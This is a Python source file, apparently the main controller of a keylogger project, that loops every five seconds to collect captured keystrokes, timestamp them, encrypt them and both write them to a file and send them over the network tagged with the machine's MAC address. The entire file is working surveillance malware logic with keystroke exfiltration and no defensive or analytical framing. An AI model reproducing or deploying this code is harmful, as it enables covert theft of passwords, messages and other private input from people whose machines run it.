from encryptionDecryption.encryption import Encryption
from keylogger.keylogger_service import KeyloggerService
from writer.FileWriter import FileWriter
from writer.NetWorkWriter import NetWorkWriter
from time import sleep
from datetime import datetime
import uuid
import logging

logging.basicConfig(filename='log.txt', level=logging.DEBUG, format='%(asctime)s - %(message)s', filemode='a')

class KeyLoggerManager:
    def __init__(self):
        self.mac_address = hex(uuid.getnode())
        self.file_writer = FileWriter()
        self.netWork_writer = NetWorkWriter()
        self.keylogger = KeyloggerService()
        self.encoder = Encryption(open('key.txt', 'r').read())
        self.flag = True

    def start(self):
        try:
            self.keylogger.start_logging()
            logging.info('Logging started')
        except KeyboardInterrupt:
            self.keylogger.stop_logging()
            self.flag = False


    def handle_logging(self):
        """
        Get the logins from the logger, add time stamp, encrypt it, write to file and send it
        :return:
        """
        while self.flag:
            logged_keys = "".join(self.keylogger.get_logged_keys())
            if logged_keys:
                if "stop" in logged_keys:
                    self.keylogger.stop_logging()
                    self.flag = False
                    logged_keys = logged_keys.split('stop')[0] + 'stop'
                logged_keys = datetime.now().strftime('%H:%M:%S %d/%m/%Y\n') + logged_keys
                try:
                    encrypted_data = self.encoder.encryption(logged_keys)
                    self.file_writer.send_data(encrypted_data, self.mac_address)
                    self.netWork_writer.send_data(encrypted_data, self.mac_address)
                except Exception as e:
                    logging.error(e)
                    return
            sleep(5)


def main():
    key_logger = KeyLoggerManager()
    key_logger.start()
    key_logger.handle_logging()



if __name__ == "__main__":
    main()

